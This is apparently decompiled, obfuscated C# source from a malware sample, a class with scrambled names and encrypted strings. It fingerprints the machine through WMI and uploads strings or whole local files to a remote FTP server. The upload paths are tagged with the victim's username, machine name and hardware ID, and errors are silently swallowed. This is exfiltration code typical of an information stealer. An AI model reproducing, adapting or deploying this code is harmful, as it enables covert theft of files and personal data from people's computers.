using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

internal sealed class fSyEEKEvmFT
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string nMrSkKEDtWhjtyXS()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107404475));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404486)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107404437);
		ManagementObject val3 = new ManagementObject(getString_0(107404432) + text2 + getString_0(107404423));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107404418)).ToString();
		return text3 + text;
	}

	public static void kSTebJdbUq(string oqXjABVZtCzuCTs = "URL", string AicFZyohPDo = "USERNAME", string TSvqQerwjJ = "ACCESO", string fNUCniGKpUtj = "")
	{
		try
		{
			string text = nMrSkKEDtWhjtyXS();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(oqXjABVZtCzuCTs + getString_0(107407174) + Environment.UserName + getString_0(107407129) + Environment.MachineName + getString_0(107407140) + text + getString_0(107407135));
			ftpWebRequest.Method = getString_0(107404393);
			ftpWebRequest.Credentials = new NetworkCredential(AicFZyohPDo, TSvqQerwjJ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(fNUCniGKpUtj);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void dOvkKfZERAIf(string uaIFwqBQWsVm = "URL", string WUNflsCIXbKM = "USERNAME", string ywKQzuUcHDOFr = "ACCESO", string eVRiUKnwrlH = "")
	{
		try
		{
			string text = nMrSkKEDtWhjtyXS();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(uaIFwqBQWsVm + getString_0(107407174) + Environment.UserName + getString_0(107407129) + Environment.MachineName + getString_0(107407140) + text + getString_0(107407140) + Path.GetFileName(eVRiUKnwrlH));
			ftpWebRequest.Method = getString_0(107404393);
			ftpWebRequest.Credentials = new NetworkCredential(WUNflsCIXbKM, ywKQzuUcHDOFr);
			byte[] array = File.ReadAllBytes(eVRiUKnwrlH);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static fSyEEKEvmFT()
	{
		Strings.CreateGetStringDelegate(typeof(fSyEEKEvmFT));
	}
}
